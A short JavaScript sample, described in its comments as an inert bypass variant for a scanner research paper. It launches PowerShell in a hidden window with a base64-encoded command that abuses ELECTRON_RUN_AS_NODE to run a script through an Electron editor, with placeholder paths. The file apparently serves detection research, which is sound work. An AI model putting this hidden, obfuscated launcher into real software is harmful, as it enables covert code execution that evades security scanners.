// Inert bypass variant for the scanner paper (RQ3): placeholder values only,
// and the scanner never runs this file.
// Change: the hidden-window flag is supplied as an encoded PowerShell command.
const { spawn } = require('child_process');
const inner = "$env:ELECTRON_RUN_AS_NODE='1'; & 'C:\\Placeholder\\Editor.exe' 'C:\\Placeholder\\agent.js'";
function start() {
  spawn('powershell.exe', ['-NoProfile', '-EncodedCommand', Buffer.from(inner, 'utf16le').toString('base64')], { windowsHide: true });
}
module.exports = { start };
